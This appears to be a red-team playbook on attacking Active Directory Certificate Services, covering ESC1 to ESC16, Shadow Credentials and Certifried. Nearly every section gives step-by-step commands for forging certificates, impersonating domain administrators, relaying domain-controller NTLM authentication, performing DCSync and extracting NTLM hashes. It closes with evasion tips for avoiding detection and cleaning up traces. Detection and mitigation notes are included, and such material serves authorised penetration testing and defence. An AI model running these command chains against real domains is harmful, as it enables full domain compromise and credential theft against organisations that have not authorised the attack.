# Active Directory Certificate Services (ADCS) Attacks

> **MITRE ATT&CK**: Privilege Escalation > T1649 - Steal or Forge Authentication Certificates
> **Platforms**: Windows
> **Required Privileges**: User (ESC1) to Domain Admin (varies)
> **OPSEC Risk**: Low-Medium (certificates are legitimate authentication mechanisms)

## Strategic Overview

ADCS is one of the most impactful attack surfaces in modern AD environments. Certificates
provide an alternative authentication path that survives password changes, often has weak
monitoring, and can grant domain admin through a single misconfigured template. As a Red Team
Lead, ADCS exploitation should be your first escalation path to evaluate -- it is frequently
misconfigured and poorly understood by defenders. The attack surface expanded significantly in
2024-2025 with ESC13-ESC16, targeting post-KB5014754 certificate mapping mechanisms, issuance
policy semantics, schema version disparities, and CA-wide security extension suppression.
Certipy v5 and Certify 2.0 provide full tooling support for these new vectors.

---

## Enumeration

### Certify.exe (Windows)
```powershell
# Find all vulnerable templates (checks ESC1-ESC8)
.\Certify.exe find /vulnerable

# Enumerate all CAs
.\Certify.exe cas

# Enumerate all templates (not just vulnerable)
.\Certify.exe find

# Check specific template
.\Certify.exe find /template:VulnTemplate

# Enumerate with current user's enrollment rights
.\Certify.exe find /currentuser
```

### Certipy (Linux)
```bash
# Comprehensive enumeration with vulnerability detection
certipy find -u user -p 'password' -dc-ip DC_IP -vulnerable -stdout

# Full enumeration to JSON (for offline analysis)
certipy find -u user -p 'password' -dc-ip DC_IP -json -output enum.json

# Using NTLM hash
certipy find -u user -hashes :NTLM_HASH -dc-ip DC_IP -vulnerable
```

### Manual LDAP Enumeration
```powershell
# Find certificate templates
Get-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(objectClass=pKICertificateTemplate)" | select name, mspki-certificate-name-flag, mspki-enrollment-flag, pkiextendedkeyusage

# Find CAs
Get-DomainObject -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" | select name, dnshostname, certificatetemplates
```

---

## ESC1: Misconfigured Certificate Templates

### Conditions (ALL must be true)
1. **Enrollee supplies subject**: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` in `msPKI-Certificate-Name-Flag`
2. **EKU allows authentication**: Client Authentication, PKINIT, Smart Card Logon, or Any Purpose
3. **Low-privilege enrollment**: Domain Users or Domain Computers can enroll
4. **Manager approval not required**: `msPKI-Enrollment-Flag` does not include `CT_FLAG_PEND_ALL_REQUESTS`

### Exploitation
```powershell
# Certify.exe - request cert with alternative UPN
.\Certify.exe request /ca:DC01.domain.local\domain-CA /template:VulnTemplate /altname:administrator

# Convert PEM to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Authenticate with the certificate
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt
```
```bash
# Certipy - request and authenticate in one flow
certipy req -u user -p 'password' -ca 'domain-CA' -template 'VulnTemplate' -upn 'administrator@domain.local' -dc-ip DC_IP

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# Returns NT hash via UnPAC-the-hash
```

### Detection
- **Event ID 4886**: Certificate request received (CA event log)
- **Event ID 4887**: Certificate issued
- Monitor for certificates with SANs that differ from the requester
- Alert on certificate requests for privileged accounts from non-privileged users

---

## ESC2: Any Purpose or SubCA EKU

### Conditions
- Template has **Any Purpose** EKU (OID 2.5.29.37.0) or **SubCA** EKU, or no EKU at all
- Low-privilege enrollment allowed

### Exploitation
Same technique as ESC1. The Any Purpose EKU means the certificate can be used for client
authentication, code signing, or any other purpose. A SubCA certificate is even more powerful --
it can issue certificates.

```bash
certipy req -u user -p pass -ca 'domain-CA' -template 'AnyPurposeTemplate' -upn administrator@domain.local
```

---

## ESC3: Enrollment Agent Templates

### Conditions
1. A template exists with **Certificate Request Agent** EKU (OID 1.3.6.1.4.1.311.20.2.1)
2. Another template allows enrollment on behalf of others
3. Low-privilege user can enroll in the agent template

### Exploitation (Two Steps)
```bash
# Step 1: Request an enrollment agent certificate
certipy req -u user -p pass -ca 'domain-CA' -template 'EnrollmentAgent'

# Step 2: Use the agent certificate to request a cert on behalf of another user
certipy req -u user -p pass -ca 'domain-CA' -template 'User' -on-behalf-of 'domain\administrator' -pfx enrollment_agent.pfx

# Step 3: Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## ESC4: Vulnerable Certificate Template ACLs

### Conditions
- Low-privilege user has **write access** to a certificate template object (GenericAll,
  GenericWrite, WriteProperty, WriteDacl, WriteOwner)
- The template can be modified to create an ESC1 condition

### Exploitation
```bash
# Certipy - automatically modifies the template, exploits, and restores
certipy template -u user -p pass -template 'WritableTemplate' -save-old

# The template is now ESC1-vulnerable -- exploit it
certipy req -u user -p pass -ca 'domain-CA' -template 'WritableTemplate' -upn administrator@domain.local

# Restore the original template configuration
certipy template -u user -p pass -template 'WritableTemplate' -configuration old_config.json
```

```powershell
# Manual approach with PowerView
# Save original template values
$template = Get-DomainObject -Identity "CN=WritableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"

# Modify to enable SAN specification and Client Auth EKU
Set-DomainObject -Identity $template.distinguishedname -Set @{
    'mspki-certificate-name-flag' = 1;      # ENROLLEE_SUPPLIES_SUBJECT
    'pkiextendedkeyusage' = '1.3.6.1.5.5.7.3.2';  # Client Authentication
    'mspki-enrollment-flag' = 0              # No approval required
}

# Exploit as ESC1, then restore original values
```

---

## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

### Conditions
- The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled
- This CA-level flag allows ANY template request to include a Subject Alternative Name

### Exploitation
```powershell
# Any template becomes ESC1-exploitable
.\Certify.exe request /ca:DC01.domain.local\domain-CA /template:User /altname:administrator
```
```bash
certipy req -u user -p pass -ca 'domain-CA' -template 'User' -upn administrator@domain.local
```

### Detection
```powershell
# Check if the flag is set on the CA
certutil -config "DC01\domain-CA" -getreg policy\EditFlags
# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000)
```

---

## ESC7: Vulnerable CA ACLs

### Conditions
- Attacker has **ManageCA** permission on the CA (can modify CA configuration)
- Or attacker has **ManageCertificates** permission (can approve pending requests)

### Exploitation
```bash
# If user has ManageCA: enable SubCA template and approve requests
# Step 1: Add yourself as CA officer
certipy ca -u user -p pass -ca 'domain-CA' -add-officer user

# Step 2: Enable SubCA template (if not already)
certipy ca -u user -p pass -ca 'domain-CA' -enable-template 'SubCA'

# Step 3: Request SubCA cert (will be denied but saved as pending)
certipy req -u user -p pass -ca 'domain-CA' -template 'SubCA' -upn administrator@domain.local

# Step 4: Approve the pending request (using ManageCertificates or officer rights)
certipy ca -u user -p pass -ca 'domain-CA' -issue-request REQUEST_ID

# Step 5: Retrieve the issued certificate
certipy req -u user -p pass -ca 'domain-CA' -retrieve REQUEST_ID
```

---

## ESC8: NTLM Relay to HTTP Enrollment

### Conditions
- CA has **HTTP enrollment endpoint** enabled (certsrv)
- NTLM authentication is accepted (no EPA -- Extended Protection for Authentication)
- Attacker can coerce NTLM authentication from a valuable target (DC, admin)

### Exploitation
```bash
# Terminal 1: Set up NTLM relay to ADCS HTTP enrollment
ntlmrelayx.py -t http://ca-server.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2: Coerce DC authentication (PetitPotam)
python3 PetitPotam.py attacker_ip dc01.domain.local

# ntlmrelayx captures the DC's NTLM auth and relays it to ADCS
# Outputs a base64 certificate for the DC machine account

# Use the certificate to authenticate as the DC
certipy auth -pfx dc01.pfx -dc-ip DC_IP

# Now perform DCSync with the DC machine account
secretsdump.py -hashes :NTLM_HASH domain.local/'DC01$'@dc01.domain.local
```

### Alternative Coercion Methods
```bash
# DFSCoerce
python3 DFSCoerce.py -u user -p pass -d domain.local attacker_ip dc01.domain.local

# PrinterBug
python3 printerbug.py domain.local/user:pass@dc01.domain.local attacker_ip

# ShadowCoerce
python3 ShadowCoerce.py -u user -p pass -d domain.local attacker_ip dc01.domain.local
```

---

## ESC9 - ESC16 (Post-2021 Research)

### ESC9: No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)
- Template does not embed the requester's `szOID_NTDS_CA_SECURITY_EXT` SID
- Combined with `StrongCertificateBindingEnforcement = 0` or `1`, allows impersonation
- Attacker with GenericWrite on a user can change their UPN, request a cert, restore UPN

### ESC10: Weak Certificate Mapping
- When `StrongCertificateBindingEnforcement = 0`: Any cert with matching UPN authenticates
- When `CertificateMappingMethods` includes `UPN mapping (0x4)`: UPN-based mapping without
  additional verification

### ESC11: IF_ENFORCEENCRYPTICERTREQUEST Misconfiguration
- CA does not enforce RPC encryption for certificate requests
- Allows NTLM relay to RPC-based certificate enrollment (instead of HTTP in ESC8)
- Exploited via `certipy relay` to the CA's RPC endpoint

### ESC13: Issuance Policy OID Group Link Abuse

Exploits the `msDS-OIDToGroupLink` attribute that links an issuance policy OID to a universal
AD security group. When a principal enrolls a certificate from a template with this policy, the
DC treats the certificate holder as a member of the linked group during authentication -- even
without actual group membership.

```bash
# Conditions (ALL must be true):
# 1. Attacker has enrollment rights on the template
# 2. Template has an issuance policy extension configured
# 3. The issuance policy OID has msDS-OIDToGroupLink to a universal group
# 4. The linked group must be empty (Authentication Mechanism Assurance requirement)
# 5. Template has EKUs permitting client authentication

# Enumeration with Certipy v5
certipy find -u user -p 'password' -dc-ip DC_IP -vulnerable -stdout
# Look for templates with "Certificate Issuance Policies" and OID group links

# Enumeration with Certify 2.0
.\Certify.exe find /vulnerable
# New output includes "Certificate Issuance Policies" attribute

# Check for OID group links
Get-ADObject -Filter {objectClass -eq "msPKI-Enterprise-Oid"} -Properties msDS-OIDToGroupLink | Where-Object {$_."msDS-OIDToGroupLink" -ne $null}

# Exploitation: Request certificate from vulnerable template
certipy req -u user -p 'password' -ca 'domain-CA' -template 'VulnPolicyTemplate' -dc-ip DC_IP

# Authenticate -- DC grants linked group privileges
certipy auth -pfx user.pfx -dc-ip DC_IP
# If OID links to Domain Admins -> direct domain compromise
```

**Detection**: Audit `msDS-OIDToGroupLink` attributes; monitor Event ID 4887 for templates with
issuance policies. BloodHound exposes this as the `ADCSESC13` edge.

---

### ESC14: Weak Explicit Certificate Mapping via altSecurityIdentities

Targets the `altSecurityIdentities` attribute on AD user/computer objects that allows manual
certificate-to-account mapping. If the mapping uses weak identifiers (Issuer + Subject CN,
email, or Subject Key Identifier), an attacker can forge or obtain a matching certificate.

```bash
# Scenario A: Attacker has write access to target's altSecurityIdentities
# 1. Write an explicit mapping referencing attacker's certificate
# 2. Authenticate with attacker's certificate as the target

# Scenario B: Pre-existing weak mapping (no write access needed)
# 1. Target already has weak altSecurityIdentities (e.g., X509:<RFC822>user@domain.com)
# 2. Attacker modifies a reusable identifier (e.g., mail attribute) on a victim principal
# 3. Enrolls a certificate matching the weak mapping criteria
# 4. Authenticates as the target

# Critical: As of April 2025, Microsoft reclassified X509SKI mappings as weak
# StrongCertificateBindingEnforcement=2 (Full Enforcement) blocks this attack

# Audit weak mappings across domain
Get-ADUser -Filter {altSecurityIdentities -like "*"} -Properties altSecurityIdentities | Select-Object Name, altSecurityIdentities

# Monitor changes to altSecurityIdentities (Event ID 5136)
```

**Detection**: Audit all `altSecurityIdentities` attributes; set `StrongCertificateBindingEnforcement`
to `2`; monitor Event ID 5136 for attribute changes. Certipy v5 supports ESC14 post-exploitation.

---

### ESC15 (EKUwu): Application Policy Injection (CVE-2024-49019)

Discovered by TrustedSec (Justin Bollinger), ESC15 exploits Schema Version 1 templates that
lack the `msPKI-Certificate-Application-Policy` attribute. An attacker can inject arbitrary
application policy OIDs (like Client Authentication) into a CSR, and the CA will honor them.

```bash
# Conditions:
# 1. CA server NOT patched for CVE-2024-49019 (Nov 2024 Patch Tuesday)
# 2. Schema Version 1 certificate template exists (all default v1 templates)
# 3. Attacker has enrollment rights on the v1 template
# Note: Default templates like "User", "Computer" are all v1 = all vulnerable

# Identify v1 templates
.\Certify.exe find
# Look for "Schema Version: 1" in output

# Exploitation with Certipy v5
certipy req -u user -p 'password' -ca 'domain-CA' -template 'User' \
  -application-policy '1.3.6.1.5.5.7.3.2' -dc-ip DC_IP
# Injects Client Authentication OID into the CSR
# CA issues certificate with the injected EKU

# Exploitation with Certify 2.0
.\Certify.exe request /ca:DC01\domain-CA /template:User /applicationpolicy:1.3.6.1.5.5.7.3.2

# Authenticate with the certificate
certipy auth -pfx user.pfx -dc-ip DC_IP
```

**Detection**: Apply CVE-2024-49019 patch; upgrade v1 templates to v2+; monitor for certificate
requests with unexpected application policy extensions.

---

### ESC16: Security Extension Disabled on CA (CA-Wide)

ESC16 is the CA-wide equivalent of ESC9. When the SID security extension
(`szOID_NTDS_CA_SECURITY_EXT`, OID `1.3.6.1.4.1.311.25.2`) is globally disabled at the CA
level via the `DisableExtensionList` registry key, **no certificate** issued by the CA will
contain the SID extension. Without it, DCs fall back to weak UPN-based mapping.

```bash
# Conditions:
# 1. CA has 1.3.6.1.4.1.311.25.2 in DisableExtensionList registry key
#    at HKLM\SYSTEM\CCS\Services\CertSvc\Configuration\<CA>\PolicyModules\<Module>
# 2. StrongCertificateBindingEnforcement is NOT 2 (not Full Enforcement)
# 3. Template allows enrollment with client auth EKUs

# Enumeration with Certify 2.0 (new "Disabled Extensions" attribute)
.\Certify.exe cas
# Look for "Disabled Extensions" in CA output

# Enumeration with Certipy v5
certipy find -u user -p 'password' -dc-ip DC_IP -vulnerable -stdout
# ESC16 flagged automatically

# Exploitation:
# 1. Modify attacker's UPN to match target (e.g., Administrator)
Set-ADUser -Identity attacker -UserPrincipalName "administrator@domain.local"

# 2. Request certificate -- CA omits SID extension
certipy req -u attacker -p 'password' -ca 'domain-CA' -template 'User' -dc-ip DC_IP

# 3. Restore original UPN
Set-ADUser -Identity attacker -UserPrincipalName "attacker@domain.local"

# 4. Authenticate -- DC falls back to UPN mapping, maps cert to Administrator
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# Mitigation:
# Remove 1.3.6.1.4.1.311.25.2 from CA's DisableExtensionList
# Set StrongCertificateBindingEnforcement to 2 on all DCs
# Monitor Event ID 5136 for UPN changes on user objects
```

**Detection**: Audit CA registry for `DisableExtensionList`; enforce strong certificate binding
(`StrongCertificateBindingEnforcement = 2`); monitor UPN changes (Event ID 5136).

---

### ESC13-16 Tool Support Summary

| ESC | Certipy v5 | Certify 2.0 | BloodHound |
|-----|-----------|-------------|------------|
| ESC13 | Full enumerate + exploit | Enumerate (new attribute) | ADCSESC13 edge |
| ESC14 | Post-exploitation | Limited (request only) | Planned |
| ESC15 | Full (`--application-policy`) | Full (`/applicationpolicy:`) | N/A |
| ESC16 | Full (discovered by Certipy) | CA disabled extensions | Planned |

---

## Shadow Credentials

### Theory
The `msDS-KeyCredentialLink` attribute allows certificate-based (PKINIT) authentication.
If an attacker has write access to a user or computer object, they can add a Key Credential
and authenticate as that principal using the corresponding private key.

### Exploitation
```powershell
# Whisker (C#)
.\Whisker.exe add /target:victim_user /domain:domain.local /dc:dc01.domain.local
# Outputs Rubeus command for authentication

# Use the generated Rubeus command
.\Rubeus.exe asktgt /user:victim_user /certificate:BASE64_CERT /password:GENERATED_PASS /domain:domain.local /dc:dc01 /getcredentials /show /nowrap

# Cleanup
.\Whisker.exe remove /target:victim_user /deviceid:DEVICE_GUID /domain:domain.local
```
```bash
# Certipy
certipy shadow auto -u attacker -p pass -account victim_user -dc-ip DC_IP
# Automatically adds shadow credential, authenticates, retrieves NT hash, and cleans up

# PyWhisker (Python)
python3 pywhisker.py -d domain.local -u attacker -p pass --target victim_user --action add --dc-ip DC_IP
```

### Detection
- **Event ID 5136**: Modification of `msDS-KeyCredentialLink` attribute
- Monitor for unexpected additions to this attribute on sensitive accounts
- Baseline legitimate Windows Hello for Business key registrations

---

## Certifried (CVE-2022-26923)

### Theory
Pre-patch, when creating a machine account, the `dNSHostName` attribute was used for
certificate identity mapping. By changing the `dNSHostName` of a machine account to match
a DC's hostname, a certificate requested for that machine account would authenticate as the DC.

### Exploitation
```bash
# Create machine account with DC's dNSHostName
certipy account create -u user -p pass -dc-ip DC_IP -dns dc01.domain.local -user 'FAKECOMP$' -pass 'Password123!'

# Request certificate using Machine template
certipy req -u 'FAKECOMP$' -p 'Password123!' -ca 'domain-CA' -template 'Machine' -dc-ip DC_IP

# Authenticate as DC
certipy auth -pfx dc01.pfx -dc-ip DC_IP
```

### Note
Patched in May 2022 (KB5014754). Post-patch, certificate mapping uses SID-based strong
mapping. However, many environments are slow to patch.

---

## Using Certificates for Authentication

### PKINIT Authentication
```powershell
# Rubeus - request TGT using certificate
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfx_password /ptt /nowrap

# Rubeus - request TGT and extract NTLM hash (UnPAC-the-hash)
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfx_password /getcredentials /show /nowrap
```
```bash
# Certipy - authenticate and get NT hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP -username administrator -domain domain.local
```

### UnPAC-the-Hash
When authenticating via PKINIT, the KDC includes the user's NTLM hash in the encrypted
part of the AS-REP (PAC_CREDENTIAL_INFO). This means a valid certificate allows you to
recover the user's current NTLM hash -- even after password changes.

---

## Detection & Evasion

### How Defenders Detect This
| Attack | Detection Method |
|--------|-----------------|
| ESC1 | Event 4886/4887: SAN differs from requester |
| ESC4 | Event 5136: Certificate template modification |
| ESC8 | NTLM relay traffic to /certsrv endpoint |
| Shadow Credentials | Event 5136: msDS-KeyCredentialLink modification |
| Certifried | Event 4741: Machine account creation with suspicious dNSHostName |
| All | PSRemoting/WinRM sessions using certificate auth |

### Evasion Techniques
- Certificates are legitimate auth -- their use blends with normal PKINIT traffic
- Request certificates with normal lifetimes (1 year default, not 10 years)
- Clean up: Remove shadow credentials, restore modified templates
- Use certificates on the network rather than extracting NTLM hashes (less detectable)
- Avoid requesting certificates for well-known admin accounts (use service accounts)

---

## Cross-References

- [AD Fundamentals](./ad-fundamentals.md) -- Kerberos PKINIT, SPN, and authentication basics
- [Kerberos Attacks](./kerberos-attacks-deep-dive.md) -- TGT/TGS mechanics exploited by ADCS auth
- [AD Persistence](./ad-persistence-deep-dive.md) -- Long-lived certificates as persistence
- [AD Attack Path Methodology](./ad-attack-path-methodology.md) -- ADCS in Phase 4 escalation

---

## References

- [SpecterOps: Certified Pre-Owned (original ADCS research)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Will Schroeder & Lee Christensen: Certified Pre-Owned Whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Certipy GitHub (v5)](https://github.com/ly4k/Certipy)
- [Certify 2.0 (SpecterOps)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [Oliver Lyak: Certifried CVE-2022-26923](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
- [Elad Shamir: Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [ESC9-ESC13 Research by SpecterOps](https://posts.specterops.io/)
- [ESC13: ADCS Abuse Technique (SpecterOps)](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
- [ESC14: Explicit Certificate Mapping (SpecterOps)](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [ESC15/EKUwu/CVE-2024-49019 (TrustedSec)](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [ESC16 and Certipy v5](https://github.com/ly4k/Certipy/discussions/270)
- [Breaking ADCS: ESC1 to ESC16 Complete Reference](https://xbz0n.sh/blog/adcs-complete-attack-reference)
